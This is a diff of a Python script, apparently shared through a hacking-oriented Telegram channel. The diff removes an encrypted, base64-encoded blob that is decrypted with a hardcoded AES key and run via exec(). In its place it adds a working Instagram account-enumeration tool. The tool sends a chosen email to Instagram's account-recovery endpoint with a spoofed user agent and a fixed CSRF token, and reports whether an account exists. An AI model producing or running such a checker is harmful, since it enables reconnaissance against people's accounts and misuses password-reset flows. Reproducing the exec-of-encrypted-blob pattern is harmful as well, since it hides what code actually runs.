@@ -1,14 +1,38 @@
-from Crypto.Cipher import AES
-import base64
-key = b'mysecretkey12345'  
-iv = b'initialvector123'    
-def decrypt(enc):
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted = cipher.decrypt(base64.b64decode(enc))
-    return decrypted.rstrip(b"\0").decode('utf-8')
-code_ = """
-gK4ZpvFzJSrEDKR3ilU+HucfcejvGIoWIZWNCWc3b6hJ9/TfCTo8lAGaG2sVNe5btMgvzFMxoNvPJkSOxXzUuAYConDTN9LKYHah8bV8Gmk6e2kxr7VkoOiliFwKEuIXCWhCsAuv8yuHLGCwu0gIyfdn/fxAkFhDekIlHpQlxlqXwPF30CYoDBNndIiQevO56j0q0HAYxBSOZgD+NOv8v8xy0GmjKti5WI/xl9rk2xgt/V26DGrrrj33TlrD/V5v2BrVbEXesAHubF1iCn0oQQaJ5Rgbyhl3YzmCHG5flx1dFPFzTxNgiESx2YUvqZeCcougaemtixhNEWdLHNLOj35R6Id5CRJuj0/NlM7/GpE9bsDs0nNH77GSph6nqOribE7++AgKDwmfz3vAm7HHaoX4j9p83D94B9VEALhfOu7Kh0Zdwch5FdI4ZwFvnzROmlYydnRitJoPgy5L2rpIs45GwAMftOxSN0waumwy3iDivup7CinblcpD1U/RX63t3oinroppDbAo7teeZfWNtCj6Wdc05vlSsr9ntTD/fkIDd5pVsAjda65pCco5UVggI86VoXyjZLWzMl2eD+PrMTH0k5w7U5EixNyXivLUfzMoN0JYyfn+S2zkTncZOXOB4fo1+JYV5/orplUyQHEY0bapfLX8DCAzDl69Ft9/bTBktOweK+YtvoKzAd1uxzG+tvyGlmiY/Z+M7b0LSxmebp4kc0PmKaQ/C2rfcZ/y6l033gzXrshZt9h0biIkBhrRxNBDfX4iJIEU6c62V2Ix58xtLRrcbLhEBs71OorMrtKTcV5md/Dkf65CJj7MUYDVJiZIII96p9ikKJEcPalxRVsb6U9h/nytys5vpOc1mixocKvwJv/q3JudcXff25ANyLvHlbKZMJ1dfnTcljb0euTcI5xu5XDfPhnk198k0mp/aoHNLZmp+XmyD9XCjUTX1hx1M38uVjV5eqdnJcrSkj0QdRSVaubA6VuqBZOtxTsIXecb7Y7EAn5hEqs3S8I1EZnsZhaDWulYCXDy9qpmggfC5283jBzqGTWNJe57CkX5ZZnihyNWG63wnphZLlkO8PfFPjcfmnQEt3OgqCnIynCwa5Oy6gknwBLOHn7QBl316iwTCUK1MpsuktdKqh4zxJd195JMPWSm7KUtaUCeJ85rJYKU9HXfujzV329pGqknVQy6YKH0rdYtdQjS3Hm0CihyTDX67GW86wkGk3+NUmnuj/RZNBIhWBn2/dTzq1YIvAloAUhbOK6ZCLHnttkZI5Fk2DEffMlqwM4tnQa1atrlz2NyRTIzIEyHRdk/0Y3onbrrVYz+0LO6hZvgO2u1DJoiDFq7sRZnSTSPHqu4kC512h9h4jWPf/f6yHf/Fe4oEDGuFEpWG5m92QVR27XH
-"""
-code = decrypt(code_)
-exec(code)
-#الي يريد ياخذه خلي ياخذه لان تشفير واضح ويمك key و iv لكن اذكر المصدر وشكرا 
+import requests
+from user_agent import generate_user_agent
+from pystyle import Colors ,Write
+from colorama import Fore, Style
+#..................................................
+useragent = generate_user_agent()
+#..................................................
+print("""  _                              ___   ___ 
+ | |__   _ __   __ _   ___  ___ |_  ) | __|
+ | '_ \ | '_ \ / _` | (_-< (_-<  / /  |__ 
+ |_.__/ | .__/ \__,_| /__/ /__/ /___| |___/
+        |_|      
+
+        Telegram chanal : @bpass25
+        Telegram user : @bpass25_25
+        
+        """)
+#..................................................
+
+def check_instagram():
+    url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+    data = { 
+        "email_or_username": Email,
+        "jazoest": 21779
+            }
+    headers = {
+        "user-agent" : useragent,
+
+        "x-csrftoken" : "LSdjRJ1tB-73_eU_POHXGn"
+    }
+    req_ = requests.post(url=url, data=data,headers=headers)
+    if "toast_message"  in req_.json():
+        print("Email is Fonud in the instagram" )
+    else :
+        print("Email is not Fonud in the instagram")
+#..................................................
+Email = Write.Input("Enter your email : ",Colors.blue_to_red)
+check_instagram()
